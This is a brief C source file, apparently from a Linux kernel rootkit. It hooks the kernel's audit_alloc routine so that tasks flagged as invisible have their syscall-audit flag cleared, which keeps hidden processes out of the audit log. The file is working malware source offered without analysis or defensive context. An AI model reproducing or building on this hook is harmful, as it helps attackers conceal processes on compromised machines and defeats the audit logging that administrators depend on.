#include "../process.h"

int (*orig_audit_alloc)(struct task_struct *tsk);

static int rk_audit_alloc(struct task_struct *tsk)
{
	int err = 0;
	if (is_task_invisible(tsk)) {
		clear_tsk_thread_flag(tsk, TIF_SYSCALL_AUDIT);
	} else {
		err = orig_audit_alloc(tsk);
	}
	return err;
}
